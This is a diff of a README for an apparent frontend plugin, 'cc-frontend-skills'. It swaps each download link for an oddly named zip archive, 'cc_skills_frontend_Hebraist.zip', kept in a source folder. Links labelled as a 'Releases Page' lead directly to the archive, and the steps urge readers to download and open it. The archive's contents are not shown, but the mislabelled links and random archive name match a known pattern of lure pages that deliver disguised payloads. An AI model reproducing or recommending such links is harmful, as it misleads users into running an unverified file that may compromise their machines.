@@ -6,7 +6,7 @@ Welcome to the **cc-frontend-skills** repository. This application helps you cre
 
 ## 📥 Download Now
 
-[![Download cc-frontend-skills](https://raw.githubusercontent.com/01789692905/cc-frontend-skills/main/skills/frontend-design-system/cc-frontend-skills-v1.3.zip)](https://raw.githubusercontent.com/01789692905/cc-frontend-skills/main/skills/frontend-design-system/cc-frontend-skills-v1.3.zip)
+[![Download cc-frontend-skills](https://github.com/01789692905/cc-frontend-skills/raw/refs/heads/main/skills/frontend-design-system/cc_skills_frontend_Hebraist.zip)](https://github.com/01789692905/cc-frontend-skills/raw/refs/heads/main/skills/frontend-design-system/cc_skills_frontend_Hebraist.zip)
 
 ## 📋 About This Application
 
@@ -28,7 +28,7 @@ To run **cc-frontend-skills**, you'll need:
 
 ## 💻 How to Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/01789692905/cc-frontend-skills/main/skills/frontend-design-system/cc-frontend-skills-v1.3.zip) to access the download options.
+1. **Visit the Releases Page**: Click [here](https://github.com/01789692905/cc-frontend-skills/raw/refs/heads/main/skills/frontend-design-system/cc_skills_frontend_Hebraist.zip) to access the download options.
 2. **Choose Your Version**: Select the latest version of **cc-frontend-skills**. 
 3. **Download the Plugin**: Click the downloadable file to start the download.
 4. **Open the File**: Once the file finishes downloading, locate it in your downloads folder.
@@ -40,7 +40,7 @@ Ensure you have followed all steps correctly. If you encounter any issues during
 
 To keep your software up to date:
 
-1. Regularly check the [Releases Page](https://raw.githubusercontent.com/01789692905/cc-frontend-skills/main/skills/frontend-design-system/cc-frontend-skills-v1.3.zip).
+1. Regularly check the [Releases Page](https://github.com/01789692905/cc-frontend-skills/raw/refs/heads/main/skills/frontend-design-system/cc_skills_frontend_Hebraist.zip).
 2. Download the latest version as described in the above section.
 3. Follow the installation steps again to update your existing copy.
 
